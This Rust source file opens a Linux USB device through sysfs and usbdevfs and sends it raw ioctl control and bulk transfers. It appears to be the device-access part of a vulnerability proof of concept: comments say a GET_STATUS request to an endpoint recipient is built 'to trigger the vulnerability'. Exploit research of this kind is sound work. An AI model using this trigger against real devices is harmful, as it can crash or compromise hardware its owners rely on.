use regex::Regex;
use std::mem::size_of;
use std::os::fd::AsRawFd;
use std::{fs, fs::OpenOptions, path::PathBuf};
use walkdir::WalkDir;

// USB IOCTL request definitions
// include/uapi/linux/usbdevice_fs.h
#[repr(C)]
pub struct UsbControlTransfer {
    req_type: u8,
    req: u8,
    value: u16,
    index: u16,
    length: u16,
    timeout: u32,
    data: *mut libc::c_void,
}

#[repr(C)]
pub struct UsbBulkTransfer {
    ep: u32,
    len: u32,
    timeout: u32,
    data: *mut libc::c_void,
}

#[repr(C)]
pub struct UsbClaimInterface {
    interface: u32,
}

// IOCTL Operation number
// Defined as a recursive macro in the kernel
// include/uapi/linux/usbdevice_fs.h
// #define USBDEVFS_CONTROL _IOWR('U', 0, struct usbdevfs_ctrltransfer)

// include/uapi/asm-generic/ioctl.h
// #define _IOWR(type,nr,argtype)	_IOC(_IOC_READ|_IOC_WRITE,(type),(nr),(_IOC_TYPECHECK(argtype)))

// #define _IOC(dir,type,nr,size) \
// 	(((dir)  << _IOC_DIRSHIFT) | \
// 	 ((type) << _IOC_TYPESHIFT) | \
// 	 ((nr)   << _IOC_NRSHIFT) | \
// 	 ((size) << _IOC_SIZESHIFT))

// #define _IOC_NRBITS	8
// #define _IOC_TYPEBITS	8
// #define _IOC_NRSHIFT	0
// #define _IOC_TYPESHIFT	(_IOC_NRSHIFT+_IOC_NRBITS)
// #define _IOC_SIZESHIFT	(_IOC_TYPESHIFT+_IOC_TYPEBITS)
// #define _IOC_DIRSHIFT	(_IOC_SIZESHIFT+_IOC_SIZEBITS)

// Generate valid IOCTL operation number based on the USB Request type
#[inline(always)]
const fn ioc_usbdev(direction: u32, request_size: u32, request_number: u32) -> u32 {
    // We follow the exact linux kernel design so it is easir to track bugs during development
    const NRBITS: u32 = 8;
    const TYPEBITS: u32 = 8;
    const SIZEBITS: u32 = 14;
    const NRSHIFT: u32 = 0;
    const TYPESHIFT: u32 = NRSHIFT + NRBITS;
    const SIZESHIFT: u32 = TYPESHIFT + TYPEBITS;
    const DIRSHIFT: u32 = SIZESHIFT + SIZEBITS;

    const USBDEV_REQ_TYPE: u32 = b'U' as u32; // USB ioctl identifier
    (direction << DIRSHIFT)
        | (USBDEV_REQ_TYPE << TYPESHIFT)
        | (request_number << NRSHIFT)
        | (request_size << SIZESHIFT)
}

// IOCTL operation numbers
const IOC_WRITE: u32 = 0x01;
const IOC_READ: u32 = 0x02;

// Macro to assign IOCTL number to kernel USB request structs
trait IoctlRequest {
    const IOCTL: libc::c_ulong;
}
macro_rules! impl_ioctl {
    ($type:ty, $direction:expr, $number:expr) => {
        impl IoctlRequest for $type {
            const IOCTL: libc::c_ulong =
                ioc_usbdev($direction, size_of::<$type>() as u32, $number) as libc::c_ulong;
        }
    };
}

// Definition of the transfer with the IOCTL trait
impl_ioctl!(UsbControlTransfer, IOC_READ | IOC_WRITE, 0);
impl_ioctl!(UsbBulkTransfer, IOC_READ | IOC_WRITE, 2);
impl_ioctl!(UsbClaimInterface, IOC_READ, 15);

// Read hexadecimal format integer from a file
fn read_hex_from_file(path: &PathBuf) -> Option<u16> {
    let content = fs::read_to_string(path).ok()?;
    u16::from_str_radix(content.trim(), 16).ok()
}

// Read decimal format integer from a file
fn read_dec_from_file(path: &PathBuf) -> Option<u16> {
    let content = fs::read_to_string(path).ok()?;
    u16::from_str_radix(content.trim(), 10).ok()
}

#[derive(Debug)]
pub struct USBDevice {
    device_file: fs::File,
}

impl USBDevice {
    // Find the device Bus number and Device number through Linux sysfs
    pub fn find_device(device_vid: u16, device_pid: u16) -> Option<USBDevice> {
        // Iterate over all devices using the xhci_hcd interface
        let devices_re = Regex::new(r"/.*(\d{4}:\d{2}:\w{2}.\d)/usb\d/\d+-\d+$").unwrap();
        for entry in WalkDir::new("/sys/bus/pci/drivers/xhci_hcd/")
            .max_depth(3)
            .follow_links(true)
            .into_iter()
            .filter_map(walkdir::Result::ok)
            .filter(|entry| devices_re.is_match(&entry.path().to_string_lossy()))
        {
            // look on the idVendor and idProduct files
            let path = entry.path();
            let Some(vid) = read_hex_from_file(&path.join("idVendor")) else {
                continue;
            };
            let Some(pid) = read_hex_from_file(&path.join("idProduct")) else {
                continue;
            };

            // If ids match, then we found our device
            if vid == device_vid && pid == device_pid {
                let Some(busnum) = read_dec_from_file(&path.join("busnum")) else {
                    continue;
                };
                let Some(devnum) = read_dec_from_file(&path.join("devnum")) else {
                    continue;
                };
                let device_node =
                    std::path::PathBuf::from(format!("/dev/bus/usb/{busnum:03}/{devnum:03}"));

                if let Ok(device_file) =
                    OpenOptions::new().read(true).write(true).open(&device_node)
                {
                    return Some(Self { device_file });
                }
            }
        }
        None
    }

    // Claim interface
    pub fn claim_interface(&self, interface: u32) -> std::io::Result<()> {
        let mut claim_if_request = UsbClaimInterface { interface };
        self.issue_request(&mut claim_if_request)
    }

    // Send a USB request through ioctl
    fn issue_request<T: IoctlRequest>(&self, request: &mut T) -> std::io::Result<()> {
        unsafe {
            let device_fd = self.device_file.as_raw_fd();
            // Synchronous write call
            let ret = libc::ioctl(device_fd, T::IOCTL, request as *mut T);
            if ret < 0 {
                return Err(std::io::Error::last_os_error());
            }
        };
        Ok(())
    }

    // Send a Bulk request
    pub fn issue_bulk_request(&self, endpoint: u32, buf: &mut [u8]) -> std::io::Result<()> {
        let mut bulk_transfer = UsbBulkTransfer {
            ep: endpoint,
            len: buf.len() as u32,
            timeout: 1000,
            data: (buf.as_mut_ptr() as *mut u32).cast::<libc::c_void>(),
        };
        self.issue_request(&mut bulk_transfer)
    }

    // Send a Control request
    pub fn issue_control_request(&self, buf: &mut [u8]) -> std::io::Result<()> {
        // It is important to note that this is not an usb driver, therefore, we will set some
        // values in the control request to specific defaults. The idea is to use this to trigger
        // the vulnerability
        // The values in the kernel are defined in linux/include/uapi/linux/usb/ch9.h
        const USB_DIR_IN: u8 = 0x80; // Device should respond with data
        const USB_TYPE_STANDARD: u8 = 0x00;
        const USB_RECIP_ENDPOINT: u8 = 0x02;
        const USB_REQ_GET_STATUS: u8 = 0x0;
        // The vulnerable code in the switch executes on Get status requests where the recipient is
        // an endpoint
        let mut control_transfer = UsbControlTransfer {
            req_type: USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_ENDPOINT, // Direction | Type | Recipient
            req: USB_REQ_GET_STATUS,                                       // GET request code
            value: 0,
            index: 0,
            length: buf.len() as u16,
            timeout: 1000,
            data: (buf.as_mut_ptr() as *mut u32).cast::<libc::c_void>(),
        };
        self.issue_request(&mut control_transfer)
    }
}
